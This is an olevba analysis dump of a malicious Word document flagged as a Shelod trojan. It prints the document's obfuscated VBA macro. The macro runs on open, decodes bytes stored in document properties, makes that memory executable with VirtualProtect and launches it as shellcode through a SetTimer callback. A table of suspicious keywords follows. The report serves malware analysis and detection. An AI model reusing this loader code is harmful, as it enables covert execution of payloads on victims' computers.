olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-4b25916cf02440933dcc2b4009204628b9337b92f6065fd564f36d81514a002f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-4b25916cf02440933dcc2b4009204628b9337b92f6065fd564f36d81514a002f - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function MultipedsVituperatesBauson Lib "user32" Alias "KillTimer" (ByVal KindergartnersKleinian As LongPtr, ByVal SynochaTyromas As LongPtr) As LongPtr
#Else
Private Declare Function GreasebushSpringtrap Lib "user32" Alias "SetTimer" ( ByVal PollcadotDandledArmgaunt As Long, ByVal TankfulsBezzo As Long, ByVal PreaverredHoofmarkStercorariidae As Long, ByVal RestifleMouldboard As Any) As Long
#End If
#If VBA7 Then
Private Declare PtrSafe Function GreasebushSpringtrap Lib "user32" Alias "SetTimer" (ByVal DecoysRenunciationsLipsticks As LongPtr, ByVal TolerationistJemmyPicrotoxinin As LongPtr, ByVal VulgarerProtrepticalCachepots As LongPtr, ByVal StrangullionAzoturiasMelanodermia As LongPtr) As LongPtr
Private Declare PtrSafe Function CisalpinismSniveler Lib "kernel32" Alias "VirtualProtect" (ByVal EstaminConfutator As LongPtr, ByVal CowpatUnextravaganceShining As LongPtr, ByVal PlatycoelianReclothe As LongPtr, BourgeoisiePericlaustral As LongPtr) As LongPtr
#Else
Private Declare Function CisalpinismSniveler Lib "kernel32" Alias "VirtualProtect"  (ByVal CortinariousAgnizingBackstairs As Long, ByVal ChaffinessDilemmatical As Long, ByVal MenadioneFraticellian As Long, RollermakingSickenersFactrix As Long) As Long
Private Declare Function MultipedsVituperatesBauson Lib "user32" Alias "KillTimer" ( ByVal TingeRavineyAnciennete As Long, ByVal CrawleyrootSphecoideaSurdomute As Long) As Long
#End If
Private Sub Document_Open()
Dim WidthwayChocks() As Byte
#If Win64 Then
WidthwayChocks = PreeditorCatarrhallyCancroids(ActiveDocument.BuiltInDocumentProperties(jNhXorD5Xy("hh7UEnn")).Value)
#Else
WidthwayChocks = PreeditorCatarrhallyCancroids(ActiveDocument.BuiltInDocumentProperties(jNhXorD5Xy("CqlFRqEl0uw")).Value)
#End If
#If VBA7 Then
Dim CharacterizesGhoulishness As LongPtr
Dim HarrumphBarbareaAveraged As LongPtr
Dim SinesMegasyntheticVialogue As LongPtr
Dim FrickleSpadiciformUnfastening As LongPtr
#Else
Dim CharacterizesGhoulishness As Long
Dim HarrumphBarbareaAveraged As Long
Dim SinesMegasyntheticVialogue As Long
Dim FrickleSpadiciformUnfastening As Long
#End If
HarrumphBarbareaAveraged = UBound(WidthwayChocks) + 1
SinesMegasyntheticVialogue = VarPtr(WidthwayChocks(0))
CisalpinismSniveler SinesMegasyntheticVialogue, HarrumphBarbareaAveraged, 64, VarPtr(CharacterizesGhoulishness)
GetObject(jNhXorD5Xy("X8vTRaG6f")).Environment(jNhXorD5Xy("aAUT1fVR"))(jNhXorD5Xy("xUHG7226")) = ActiveDocument.FullName
GetObject(jNhXorD5Xy("J3L18e")).Environment(jNhXorD5Xy("h6Sf04X"))(jNhXorD5Xy("GXs_hhLZOB")) = jNhXorD5Xy("UCmsJocia")
If True Then
FrickleSpadiciformUnfastening = GreasebushSpringtrap(0, SinesMegasyntheticVialogue, 1, SinesMegasyntheticVialogue)
RectifierMealtimes 1
MultipedsVituperatesBauson 0, FrickleSpadiciformUnfastening
End If
GetObject(jNhXorD5Xy("LuvgsLM7")).Environment(jNhXorD5Xy("rP4uEi")).Remove (jNhXorD5Xy("vDQpYJHhMc"))
GetObject(jNhXorD5Xy("GzoNptNld7")).Environment(jNhXorD5Xy("Eb7lXQeB")).Remove (jNhXorD5Xy("wepTdGt"))
ReDim WidthwayChocks(1)
End Sub
Sub RectifierMealtimes(Finish)
Dim LemographyGnatworm As Long
Dim OverbuildingWiremanMisogynous As Long
OverbuildingWiremanMisogynous = Timer() + (Finish)
Do
LemographyGnatworm = Timer()
DoEvents
Loop Until LemographyGnatworm > OverbuildingWiremanMisogynous
End Sub
Public Function jNhXorD5Xy(strInput)
jNhXorD5Xy = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function SurprisableCupels(OuverteUnvying, VexatiousnessSnickdrawSemidiagrammatic)
SurprisableCupels = Mid(OuverteUnvying, VexatiousnessSnickdrawSemidiagrammatic + 1, 1)
End Function
Function SubterritorialCorkage(RebrickHominesses) As Long
If Int(Rnd(23)) > 2 Then
SubterritorialCorkage = 9000
Else
SubterritorialCorkage = Len(RebrickHominesses)
End If
End Function
Function PreeditorCatarrhallyCancroids(EquiniaAbulomania)
ReDim UnmethodicallySnowslipUnhero(SubterritorialCorkage(EquiniaAbulomania) - 1) As Byte
Dim IridalgiaChalazas As Long, UnfabulouslyBiomagnetismParcellary As Long
Dim UncompassionatingMinerval: UncompassionatingMinerval = jNhXorD5Xy("xPVrT98wJ") & jNhXorD5Xy("BrwDlwTPOlD")
For IridalgiaChalazas = 0 To SubterritorialCorkage(EquiniaAbulomania) - 1 Step 2
UnfabulouslyBiomagnetismParcellary = IridalgiaChalazas / 2
UnmethodicallySnowslipUnhero(UnfabulouslyBiomagnetismParcellary) = CDec(UncompassionatingMinerval & SurprisableCupels(EquiniaAbulomania, IridalgiaChalazas) & SurprisableCupels(EquiniaAbulomania, IridalgiaChalazas + 1))
Next
PreeditorCatarrhallyCancroids = UnmethodicallySnowslipUnhero
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

